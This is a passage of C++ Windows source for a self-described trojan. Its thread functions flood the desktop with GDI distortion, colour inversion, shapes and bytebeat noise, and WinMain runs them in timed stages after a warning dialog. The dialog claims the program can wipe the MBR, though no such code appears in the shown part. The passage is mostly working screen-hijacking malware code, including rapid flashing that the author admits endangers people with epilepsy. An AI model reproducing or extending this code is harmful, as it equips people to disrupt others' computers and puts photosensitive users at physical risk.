	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 30;

	while (true)
	{

		hWnd = GetDesktopWindow();
		hWindow = GetWindowDC(hWnd);
		hDsktp = GetDC(0);
		GetWindowRect(hWnd, &wRect);

		dW = GetSystemMetrics(0);
		dH = GetSystemMetrics(0);

		wPt[0].x = wRect.left - counter;
		wPt[0].y = wRect.top + counter;
		wPt[1].x = wRect.right - counter;
		wPt[1].y = wRect.top - counter;
		wPt[2].x = wRect.left + counter;
		wPt[2].y = wRect.bottom + counter;

		PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

	}
}

DWORD WINAPI plgblt2(LPVOID lpvd)
{
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 30;

	while (true)
	{

		hWnd = GetDesktopWindow();
		hWindow = GetWindowDC(hWnd);
		hDsktp = GetDC(0);
		GetWindowRect(hWnd, &wRect);

		dW = GetSystemMetrics(0);
		dH = GetSystemMetrics(0);

		wPt[0].x = wRect.left + counter;
		wPt[0].y = wRect.top + counter;
		wPt[1].x = wRect.right - counter;
		wPt[1].y = wRect.top;
		wPt[2].x = wRect.left + counter;
		wPt[2].y = wRect.bottom - counter;

		PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

	}
}

DWORD WINAPI plgblt3(LPVOID lpvd)
{
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 30;

	while (true)
	{

		hWnd = GetDesktopWindow();
		hWindow = GetWindowDC(hWnd);
		hDsktp = GetDC(0);
		GetWindowRect(hWnd, &wRect);

		dW = GetSystemMetrics(0);
		dH = GetSystemMetrics(0);

		wPt[0].x = wRect.left + counter;
		wPt[0].y = wRect.top + counter;
		wPt[1].x = wRect.right - counter;
		wPt[1].y = wRect.top;
		wPt[2].x = wRect.left - counter;
		wPt[2].y = wRect.bottom - counter;

		PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

	}
}

DWORD WINAPI mirrorr(LPVOID lpvd)
{
	while (true)
	{
		HDC hdc = GetDC(NULL);
		int x, y, l, p;
		x = GetSystemMetrics(SM_CXSCREEN);
		y = GetSystemMetrics(SM_CYSCREEN);
		HWND hwnd = GetDesktopWindow();
		RECT rekt;
		GetWindowRect(hwnd, &rekt);
		l = rand() % x;
		p = rand() % y;
		StretchBlt(hdc, x, y, rekt.left - x, rekt.top - y, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);

		Sleep(1000);
	}
}

DWORD WINAPI PatBlt3(LPVOID lpvd)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, 0, sx, sy, PATCOPY);
		Sleep(1000);
	}
}

DWORD WINAPI ellepsy(LPVOID lpvd)
{
	HDC desk = GetDC(0); // получаем HDC экрана
	int xs = GetSystemMetrics(0);//ширина экрана
	int ys = GetSystemMetrics(1);//высота экрана
	while (1)//цикл
	{
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));//делаем кисть то есть цвета
		SelectObject(desk, brush);//делаем кисть работающей
		Ellipse(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys);//функция
		Sleep(1000);
	}
}

DWORD WINAPI screendown(LPVOID pnvd)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, 10, 100, w, h, hdc, 12, 12, SRCCOPY);
		Sleep(1000);
	}
}

DWORD WINAPI darkscreen(LPVOID lpvd)
{
	HDC hdc;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(1000);
	}
}

DWORD WINAPI bytebeat(LPVOID lpvd)
{

	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 40];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t >> 2) * (t >> 6 | 11));
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);
	return 0;
}

DWORD WINAPI bytebeat2(LPVOID lpvd)
{

	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20];
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>((t << 2 >> 8) * (t << 1 | 1));
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);
	return 0;
}


DWORD WINAPI e(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	INT sw = GetSystemMetrics(0);
	INT sh = GetSystemMetrics(1);
	while (true)
	{
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, PATINVERT);
		Sleep(500);
	}
}

DWORD WINAPI PatBlt8883(LPVOID lpvd)
{
	while (true)
	{
		HDC desk = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));

		SelectObject(desk, brush);

		PatBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, PATINVERT);

		DeleteObject(brush);

		Sleep(500);
	}
}

int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
	int message = MessageBox(NULL, L"A warning! I'm watching you... Hello! If you are reading this text, then you must have discovered the Win32.trojan.ѧҏӑß(ӈƛƥ).exe virus. This is a very very very very very very very very dangerous virus! I do not advise you to click ''Yes''. You probably want to know why this virus is dangerous? It's very simple, this trojan can destroy the MBR partition! But if you don't feel sorry for your computer... Okay, let's get down to business! I will tell you about how this virus was created. Since the MCU disbanded, I had to work alone :( ... A warning! I'm watching you... Hello! If you are reading this text, then you must have discovered the Win32.trojan.ѧҏӑß(ӈƛƥ).exe virus. This is a very very very very very very very very dangerous virus! I do not advise you to click ''Yes''. You probably want to know why this virus is dangerous? It's very simple, this trojan can destroy the MBR partition! But if you don't feel sorry for your computer... Okay, let's get down to business! I will tell you about how this virus was created. Since the MCU disbanded, I had to work alone :( ... I thank HackerMotherF * **er for the tutorials.Continue to release tutorials in the same spirit.Say hello to VirusCheck, DesConnet, FeloFox, SiamAlam, MR.Virus(sorry in advance if I wrote someone's channel name wrong xD). Good luck with the launch! And yes, if you are a person with epilepsy, then do not run this Trojan! Click yes to continue, click no to exit.", L"WARNING! This is malware!", MB_YESNO | MB_ICONWARNING);
	switch (message)
	{
	case IDNO:
	{
		exit(0);
	}
	}

	CreateThread(0, 0, BadColor, 0, 0, 0);

	HANDLE pret;
	pret = CreateThread(0, 0, PatBlt8883, 0, 0, 0);
	Sleep(20000);
	TerminateThread(pret, NULL);

	HANDLE mor;
	mor = CreateThread(0, 0, more, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mor, NULL);

	HANDLE paat;
	paat = CreateThread(0, 0, PatBlt0, 0, 0, 0);
	Sleep(20000);
	TerminateThread(paat, NULL);

	HANDLE paat2;
	paat2 = CreateThread(0, 0, PatBlt2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(paat2, NULL);

	HANDLE paa3;
	paa3 = CreateThread(0, 0, PatBlt3, 0, 0, 0);
	Sleep(20000);
	TerminateThread(paa3, NULL);

	//HANDLE byte2;
	HANDLE ee;
	ee = CreateThread(0, 0, e, 0, 0, 0);
	CreateThread(0, 0, bytebeat2, 0, 0, 0);
	Sleep(10000);
	TerminateThread(ee, NULL);
	//TerminateThread(byte2, NULL);

	HANDLE efect3;
	efect3 = CreateThread(0, 0, effect3, 0, 0, 0);
	Sleep(20000);
	TerminateThread(efect3, NULL);

	HANDLE ssdown;
	ssdown = CreateThread(0, 0, sdown, 0, 0, 0);
	Sleep(20000);
	TerminateThread(ssdown, NULL);

	HANDLE efect10;
	efect10 = CreateThread(0, 0, effect10, 0, 0, 0);
	Sleep(20000);
	TerminateThread(efect10, NULL);

	HANDLE mor5;
	mor5 = CreateThread(0, 0, dornizing4, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mor5, NULL);

	HANDLE mor4;
	mor4 = CreateThread(0, 0, dornizing3, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mor4, NULL);

	HANDLE mor3;
	mor3 = CreateThread(0, 0, dornizing2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mor3, NULL);

	HANDLE mor2;
	mor2 = CreateThread(0, 0, dornizing, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mor2, NULL);

	HANDLE dark;
	dark = CreateThread(0, 0, darkscreen, 0, 0, 0);
	Sleep(20000);
	TerminateThread(dark, NULL);

	CreateThread(0, 0, MOUSEMOVE, 0, 0, 0);

	HANDLE mirror;
	mirror = CreateThread(0, 0, mirrorr, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mirror, NULL);

	//HANDLE bytee;
	HANDLE plg3;
	CreateThread(0, 0, bytebeat, 0, 0, 0);
	plg3 = CreateThread(0, 0, plgblt2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(plg3, NULL);
	HANDLE plg444;
	plg444 = CreateThread(0, 0, plgblt3, 0, 0, 0);
	Sleep(20000);
	TerminateThread(plg444, NULL);




	/*
	HANDLE mirror;
	mirror = CreateThread(0, 0, MIRROR, 0, 0, 0);
	Sleep(20000);
	TerminateThread(mirror, NULL);
	*/
	HANDLE mems;
	mems = CreateThread(0, 0, memz, 0, 0, 0);
	Sleep(30000);
	TerminateThread(mems, NULL);

	HANDLE doown;
	doown = CreateThread(0, 0, screendown, 0, 0, 0);
	Sleep(20000);
	TerminateThread(doown, NULL);

	HANDLE sinewaves;
	sinewaves = CreateThread(0, 0, (PTHREAD_START_ROUTINE)sines, 0, 0, 0);
	Sleep(30000);
	TerminateThread(sinewaves, NULL);
	HANDLE tonel;
	tonel = CreateThread(0, 0, tunnel, 0, 0, 0);
	Sleep(20000);
	TerminateThread(tonel, NULL);
	HANDLE gl;
	gl = CreateThread(0, 0, glitch, 0, 0, 0);
	Sleep(20000);
	TerminateThread(gl, NULL);
	HANDLE hel;
	hel = CreateThread(0, 0, helly1, 0, 0, 0);
	Sleep(20000);
	TerminateThread(hel, NULL);
	HANDLE efect;
	efect = CreateThread(0, 0, effect, 0, 0, 0);
	Sleep(20000);
	TerminateThread(efect, NULL);

	CreateThread(0, 0, ellepsy, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, MyTextOut, 0, 0, 0);
	CreateThread(0, 0, circles, 0, 0, 0);
	CreateThread(0, 0, error, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, drawerror, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, drawquestion, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, drawwarning, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, drawinfo, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, line, 0, 0, 0);
	CreateThread(0, 0, PatBlt110, 0, 0, 0);
	CreateThread(0, 0, cursor, 0, 0, 0);

	HANDLE wow3;
	wow3 = CreateThread(0, 0, wow1, 0, 0, 0);
	//Sleep(20000);
	//TerminateThread(wow3, NULL);
	HANDLE wow4;
	wow4 = CreateThread(0, 0, wow2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(wow4, NULL);
	TerminateThread(wow3, NULL);
	Sleep(20000);
	HANDLE efect11;
	efect11 = CreateThread(0, 0, effects11, 0, 0, 0);
	Sleep(20000);
	TerminateThread(efect11, NULL);
	HANDLE plg2;
	plg2 = CreateThread(0, 0, plg, 0, 0, 0);
	Sleep(20000);
	TerminateThread(plg2, NULL);
}
